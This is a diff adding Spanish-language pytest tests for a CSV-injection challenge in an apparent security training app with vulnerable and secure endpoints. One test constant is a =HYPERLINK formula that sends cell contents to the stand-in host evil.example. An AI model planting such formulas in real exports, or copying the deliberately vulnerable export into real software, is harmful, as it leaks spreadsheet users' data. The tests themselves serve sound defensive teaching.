@@ -69,3 +69,66 @@ def test_reto1_secure_direccion_sin_importar_mayusculas(client, seeded, directio
     rows = client.get("/secure/comments/sorted", params={"sort": "id", "direction": direction}).json()
     ids = [r["id"] for r in rows]
     assert ids == sorted(ids, reverse=direction.lower() == "desc")
+
+
+# ── Reto 2: CSV injection ───────────────────────────────────────────────────
+
+import csv  # noqa: E402
+import io  # noqa: E402
+
+HYPERLINK = '=HYPERLINK("https://evil.example/?d="&A1,"Ver detalle")'
+
+
+def _parse_csv(text):
+    return list(csv.reader(io.StringIO(text)))
+
+
+def test_reto2_vuln_exporta_formula_cruda(client):
+    client.post("/vuln/comments", json={"author": "mallory", "body": HYPERLINK})
+    lines = client.get("/vuln/comments/export.csv").text.splitlines()
+    assert any(any(cell.startswith("=HYPERLINK(") for cell in line.split(",")) for line in lines)
+
+
+def test_reto2_vuln_comas_y_saltos_rompen_la_estructura(client):
+    client.post("/vuln/comments", json={"author": "eve", "body": "uno,dos,tres\nfila,fantasma"})
+    rows = _parse_csv(client.get("/vuln/comments/export.csv").text)
+    assert any(len(r) != 2 for r in rows)  # aparecen columnas o filas que no existen
+
+
+def test_reto2_secure_neutraliza_formulas(client):
+    client.post("/vuln/comments", json={"author": "mallory", "body": HYPERLINK})
+    rows = _parse_csv(client.get("/secure/comments/export.csv").text)
+    bodies = [r[1] for r in rows[1:]]
+    assert "'" + HYPERLINK in bodies
+    assert not any(cell.startswith(("=", "+", "-", "@", "\t", "\r")) for r in rows for cell in r)
+
+
+@pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
+def test_reto2_secure_todos_los_disparadores(client, trigger):
+    body = trigger + "1+1"
+    client.post("/vuln/comments", json={"author": "trigger", "body": body})
+    bodies = [r[1] for r in _parse_csv(client.get("/secure/comments/export.csv").text)[1:]]
+    assert "'" + body in bodies
+
+
+def test_reto2_secure_comas_y_saltos_no_rompen_filas(client):
+    body = 'uno,dos,"tres"\nfila,fantasma'
+    client.post("/secure/comments", json={"author": "eve", "body": body})
+    rows = _parse_csv(client.get("/secure/comments/export.csv").text)
+    assert all(len(r) == 2 for r in rows)  # siempre author y body
+    assert ["eve", body] in rows  # y el valor vuelve intacto
+
+
+def test_reto2_secure_texto_normal_sin_cambios(client):
+    client.post("/secure/comments", json={"author": "nico", "body": "Todo bien, gracias!"})
+    rows = _parse_csv(client.get("/secure/comments/export.csv").text)
+    assert ["nico", "Todo bien, gracias!"] in rows
+
+
+def test_reto2_encoder_unitario():
+    from app.encoding import spreadsheet_cell
+
+    assert spreadsheet_cell("=1+1") == "'=1+1"
+    assert spreadsheet_cell("-5") == "'-5"
+    assert spreadsheet_cell("hola = chau") == "hola = chau"
+    assert spreadsheet_cell("") == ""
